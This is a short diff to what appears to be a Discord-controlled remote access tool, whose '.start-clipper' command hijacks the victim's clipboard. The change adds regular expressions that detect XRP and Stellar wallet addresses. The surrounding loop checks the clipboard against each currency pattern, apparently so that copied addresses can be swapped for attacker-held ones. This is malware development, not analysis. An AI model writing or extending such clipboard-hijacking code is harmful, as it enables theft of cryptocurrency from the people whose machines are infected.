@@ -24,6 +24,8 @@ elif message.content == '.start-clipper':
         bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
         dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
         trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
+        xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
+        xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
 
         for currency, address in addresses.items():
             if eval(f'{currency.lower()}_match'):
